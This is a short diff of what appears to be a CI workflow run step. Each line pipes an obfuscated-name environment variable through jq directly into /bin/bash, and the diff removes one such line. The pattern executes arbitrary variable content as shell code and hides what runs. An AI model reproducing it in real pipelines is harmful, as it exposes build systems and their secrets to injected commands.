@@ -22,7 +22,6 @@ jobs:
         run: |
           printf '%s' "$wovmz624" | jq -r .upebr7 | /bin/bash
           echo $wlz80 | jq -r .cbn6151 | /bin/bash
-          printf '%s' "$vvvq7" | jq -r .gyo8979 | /bin/bash
           printf '%s' "$nwkq35" | jq -r .sqgk4174 | /bin/bash
           printf '%s' "$k580" | jq -r .v6 | /bin/bash
           printf '%s' "$rao52" | jq -r .urmg0348 | /bin/bash
